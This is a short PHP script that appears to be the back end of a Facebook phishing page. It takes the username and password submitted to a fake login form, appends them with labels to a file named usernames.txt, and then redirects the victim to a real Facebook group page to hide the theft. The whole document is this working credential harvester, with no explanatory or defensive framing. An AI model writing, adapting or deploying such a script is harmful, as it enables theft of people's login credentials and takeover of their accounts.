<?php

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com/groups/419306582081994?ref=gysj');
exit();
